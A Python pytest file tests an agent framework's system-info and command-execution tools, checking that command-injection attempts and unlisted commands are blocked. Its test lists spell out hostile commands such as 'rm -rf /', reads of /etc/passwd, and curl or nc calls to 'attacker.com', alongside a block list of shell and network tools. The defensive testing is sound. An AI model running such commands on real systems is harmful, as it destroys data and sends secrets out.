"""Comprehensive tests for system tools with focus on command injection protection."""

from __future__ import annotations

import platform
import pytest
import sys
from freya.tools.system_tools import SystemInfoTool, ExecuteCommandTool


# ============================================================================
# FIXTURES
# ============================================================================


@pytest.fixture
def system_info_tool():
    """Provide SystemInfoTool instance."""
    return SystemInfoTool()


@pytest.fixture
def execute_command_tool():
    """Provide ExecuteCommandTool instance."""
    return ExecuteCommandTool()


# ============================================================================
# SYSTEM INFO TOOL TESTS
# ============================================================================


class TestSystemInfoTool:
    """Test system information retrieval."""

    def test_get_all_info(self, system_info_tool):
        """Get all system information."""
        result = system_info_tool.execute(info_type="all")
        
        assert result.success is True
        assert "OS:" in result.output
        assert "Python:" in result.output
        assert "Disk Space:" in result.output

    def test_get_os_info(self, system_info_tool):
        """Get OS information only."""
        result = system_info_tool.execute(info_type="os")
        
        assert result.success is True
        assert "OS:" in result.output
        assert platform.system() in result.output

    def test_get_python_info(self, system_info_tool):
        """Get Python information only."""
        result = system_info_tool.execute(info_type="python")
        
        assert result.success is True
        assert "Python:" in result.output
        assert sys.version.split()[0] in result.output
        assert "Executable:" in result.output

    def test_get_disk_info(self, system_info_tool):
        """Get disk space information."""
        result = system_info_tool.execute(info_type="disk")
        
        assert result.success is True
        assert "Disk Space:" in result.output or "Disk info unavailable" in result.output
        if "Disk Space:" in result.output:
            assert "Total:" in result.output
            assert "Free:" in result.output

    def test_result_structure(self, system_info_tool):
        """Validate SystemInfoTool ToolResult structure."""
        result = system_info_tool.execute()
        
        assert hasattr(result, "success")
        assert hasattr(result, "output")
        assert hasattr(result, "error")
        assert result.success is True
        assert isinstance(result.output, str)
        assert len(result.output) > 0


# ============================================================================
# EXECUTE COMMAND TOOL TESTS - SECURITY (Critical)
# ============================================================================


class TestExecuteCommandSecurity:
    """Test command injection protection (security-critical tests)."""

    def test_blocks_command_chaining_semicolon(self, execute_command_tool):
        """Block command chaining with semicolon."""
        dangerous_commands = [
            "echo test; rm -rf /",
            "whoami; cat /etc/passwd",
            "date ; curl attacker.com",
        ]
        
        for cmd in dangerous_commands:
            result = execute_command_tool.execute(command=cmd)
            assert result.success is False, f"Should block command: {cmd}"
            assert result.error is not None
            assert "dangerous pattern" in result.error.lower() or "security" in result.error.lower()

    def test_blocks_command_chaining_and(self, execute_command_tool):
        """Block command chaining with &&."""
        dangerous_commands = [
            "echo test && rm -rf /",
            "whoami && cat /etc/passwd",
            "date&&curl attacker.com",
        ]
        
        for cmd in dangerous_commands:
            result = execute_command_tool.execute(command=cmd)
            assert result.success is False
            assert result.error is not None

    def test_blocks_command_chaining_or(self, execute_command_tool):
        """Block command chaining with ||."""
        dangerous_commands = [
            "echo test || rm -rf /",
            "false || cat /etc/passwd",
        ]
        
        for cmd in dangerous_commands:
            result = execute_command_tool.execute(command=cmd)
            assert result.success is False
            assert result.error is not None

    def test_blocks_pipe_commands(self, execute_command_tool):
        """Block piping to other commands."""
        dangerous_commands = [
            "cat /etc/passwd | grep root",
            "echo test | nc attacker.com 1234",
            "ls | sh",
        ]
        
        for cmd in dangerous_commands:
            result = execute_command_tool.execute(command=cmd)
            assert result.success is False
            assert result.error is not None

    def test_blocks_command_substitution_backticks(self, execute_command_tool):
        """Block command substitution with backticks."""
        dangerous_commands = [
            "echo `whoami`",
            "date `rm -rf /`",
            "`cat /etc/passwd`",
        ]
        
        for cmd in dangerous_commands:
            result = execute_command_tool.execute(command=cmd)
            assert result.success is False
            assert result.error is not None

    def test_blocks_command_substitution_dollar(self, execute_command_tool):
        """Block command substitution with $()."""
        dangerous_commands = [
            "echo $(whoami)",
            "date $(rm -rf /)",
            "$(cat /etc/passwd)",
        ]
        
        for cmd in dangerous_commands:
            result = execute_command_tool.execute(command=cmd)
            assert result.success is False
            assert result.error is not None

    def test_blocks_output_redirection(self, execute_command_tool):
        """Block output redirection."""
        dangerous_commands = [
            "echo malicious > /etc/passwd",
            "cat secret.txt > attacker.com",
            "whoami > /tmp/exploit",
        ]
        
        for cmd in dangerous_commands:
            result = execute_command_tool.execute(command=cmd)
            assert result.success is False
            assert result.error is not None

    def test_blocks_input_redirection(self, execute_command_tool):
        """Block input redirection."""
        dangerous_commands = [
            "sh < exploit.sh",
            "python < malware.py",
        ]
        
        for cmd in dangerous_commands:
            result = execute_command_tool.execute(command=cmd)
            assert result.success is False
            assert result.error is not None

    def test_blocks_background_execution(self, execute_command_tool):
        """Block background execution with &."""
        dangerous_commands = [
            "nc -l 1234 &",
            "python server.py &",
        ]
        
        for cmd in dangerous_commands:
            result = execute_command_tool.execute(command=cmd)
            assert result.success is False
            assert result.error is not None

    def test_blocks_unlisted_commands(self, execute_command_tool):
        """Block commands not in whitelist."""
        dangerous_commands = [
            "rm -rf /",
            "curl attacker.com",
            "nc -l 1234",
            "python exploit.py",
            "bash -c malicious",
            "sh script.sh",
            "sudo rm -rf /",
        ]
        
        for cmd in dangerous_commands:
            result = execute_command_tool.execute(command=cmd)
            assert result.success is False, f"Should block unlisted command: {cmd}"
            assert result.error is not None
            assert "not allowed" in result.error.lower()


# ============================================================================
# EXECUTE COMMAND TOOL TESTS - FUNCTIONALITY
# ============================================================================


class TestExecuteCommandFunctionality:
    """Test safe command execution."""

    def test_execute_echo_command(self, execute_command_tool):
        """Execute safe echo command."""
        result = execute_command_tool.execute(command="echo Hello Freya")
        
        # echo may not exist as standalone command on Windows (it's a shell builtin)
        if result.success:
            assert "Hello Freya" in result.output
        else:
            assert "not found" in result.error.lower()

    @pytest.mark.skipif(platform.system() == "Windows", reason="Unix-only command")
    def test_execute_pwd_command(self, execute_command_tool):
        """Execute pwd command on Unix."""
        result = execute_command_tool.execute(command="pwd")
        
        assert result.success is True
        assert len(result.output) > 0

    @pytest.mark.skipif(platform.system() != "Windows", reason="Windows-only command")
    def test_execute_dir_command(self, execute_command_tool):
        """Execute dir command on Windows."""
        result = execute_command_tool.execute(command="dir")
        
        # dir may not be in PATH as standalone command on Windows
        # It's typically a shell builtin, so this might fail
        assert result.error is None or "not found" in result.error.lower()

    def test_execute_whoami_command(self, execute_command_tool):
        """Execute whoami command."""
        result = execute_command_tool.execute(command="whoami")
        
        # whoami should work on most systems
        if result.success:
            assert len(result.output) > 0
        else:
            # Command may not exist on some systems
            assert "not found" in result.error.lower()

    def test_execute_date_command(self, execute_command_tool):
        """Execute date command."""
        result = execute_command_tool.execute(command="date")
        
        # date should work on most Unix systems
        if result.success:
            assert len(result.output) > 0
        else:
            # May not exist on Windows
            assert "not found" in result.error.lower()

    def test_command_with_args(self, execute_command_tool):
        """Execute command with arguments."""
        result = execute_command_tool.execute(command="echo test argument")
        
        # echo may not exist as standalone command on Windows
        if result.success:
            assert "test" in result.output
            assert "argument" in result.output
        else:
            assert "not found" in result.error.lower()

    def test_command_timeout(self, execute_command_tool):
        """Test command timeout handling."""
        # This test is tricky - we need a command that will hang
        # Skip on systems where we can't reliably test this
        pytest.skip("Timeout test requires sleep command which may not be whitelisted")

    def test_empty_command(self, execute_command_tool):
        """Handle empty command gracefully."""
        result = execute_command_tool.execute(command="")
        
        assert result.success is False
        assert "empty" in result.error.lower()

    def test_invalid_command_syntax(self, execute_command_tool):
        """Handle invalid command syntax."""
        result = execute_command_tool.execute(command='echo "unclosed quote')
        
        assert result.success is False
        assert result.error is not None

    def test_metadata_includes_command_info(self, execute_command_tool):
        """Metadata includes command information."""
        result = execute_command_tool.execute(command="echo test")
        
        if result.success:
            assert "command" in result.metadata
            assert "return_code" in result.metadata
            assert result.metadata["return_code"] == 0


# ============================================================================
# COMMAND WHITELIST VALIDATION
# ============================================================================


class TestCommandWhitelist:
    """Test command whitelist enforcement."""

    def test_whitelist_contains_safe_commands(self, execute_command_tool):
        """Verify whitelist contains expected safe commands."""
        expected_commands = {"echo", "whoami", "date", "hostname", "pwd"}
        
        for cmd in expected_commands:
            assert cmd in execute_command_tool.ALLOWED_COMMANDS

    def test_whitelist_excludes_dangerous_commands(self, execute_command_tool):
        """Verify whitelist excludes dangerous commands."""
        dangerous_commands = {
            "rm", "rmdir", "del", "erase",
            "curl", "wget", "nc", "netcat",
            "python", "perl", "ruby", "node",
            "bash", "sh", "cmd", "powershell",
            "sudo", "su", "chmod", "chown",
        }
        
        for cmd in dangerous_commands:
            assert cmd not in execute_command_tool.ALLOWED_COMMANDS

    def test_dangerous_patterns_list_comprehensive(self, execute_command_tool):
        """Verify dangerous patterns list is comprehensive."""
        patterns = execute_command_tool.DANGEROUS_PATTERNS
        
        # Check for essential injection patterns
        assert any(";" in p for p in patterns), "Missing semicolon pattern"
        assert any("&&" in p for p in patterns), "Missing AND pattern"
        assert any("||" in p or r"\|\|" in p for p in patterns), "Missing OR pattern"
        assert any("|" in p for p in patterns), "Missing pipe pattern"
        assert any("`" in p for p in patterns), "Missing backtick pattern"
        assert any("$(" in p or r"\$\(" in p for p in patterns), "Missing $() pattern"


# ============================================================================
# TOOL RESULT STRUCTURE TESTS
# ============================================================================


class TestSystemToolsResult:
    """Test ToolResult structure compliance."""

    def test_system_info_result_structure(self, system_info_tool):
        """Validate SystemInfoTool ToolResult structure."""
        result = system_info_tool.execute()
        
        assert hasattr(result, "success")
        assert hasattr(result, "output")
        assert hasattr(result, "error")
        assert hasattr(result, "metadata")
        assert result.success is True
        assert isinstance(result.output, str)

    def test_execute_command_success_structure(self, execute_command_tool):
        """Validate ExecuteCommandTool success ToolResult structure."""
        result = execute_command_tool.execute(command="echo test")
        
        assert hasattr(result, "success")
        assert hasattr(result, "output")
        assert hasattr(result, "error")
        assert hasattr(result, "metadata")
        if result.success:
            assert isinstance(result.output, str)
            assert result.metadata is not None

    def test_execute_command_error_structure(self, execute_command_tool):
        """Validate ExecuteCommandTool error ToolResult structure."""
        result = execute_command_tool.execute(command="rm -rf /")
        
        assert result.success is False
        assert result.error is not None
        assert isinstance(result.error, str)
        assert len(result.error) > 0
